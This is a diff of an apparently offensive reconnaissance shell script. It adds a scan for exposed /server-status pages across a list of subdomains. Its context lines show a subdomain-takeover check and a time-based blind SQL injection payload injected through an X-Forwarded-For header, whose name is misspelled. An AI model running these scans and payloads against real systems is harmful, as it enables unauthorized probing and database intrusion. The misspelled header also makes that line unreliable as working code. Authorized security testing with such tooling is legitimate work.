@@ -64,6 +64,11 @@ echo -e "${GREEN}Running Subjack and checking for subdomain takeovers...${RESET}
 subjack -w subdomains.txt > subjack.txt
 echo -e "${CYAN}Task Completed!${RESET}"
 
+echo -e "${GREEN}Running Httpx Scanning for sensitive files...${RESET}"
+cat subdomains.txt | httpx -silent -path "/server-status" -mc 200 -title > httpx-Server-status.txt
+echo -e "${CYAN}Task Completed!${RESET}"
+
+
 # Running SQLi X-Forwarded-For
 echo -e "${GREEN}Running SQLi attack using X-Forwarded-For...${RESET}"
 cat subdomains.txt | httpx -silent -H "X-Forwraded-For:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > SQLi-X-Forwarded-For.txt
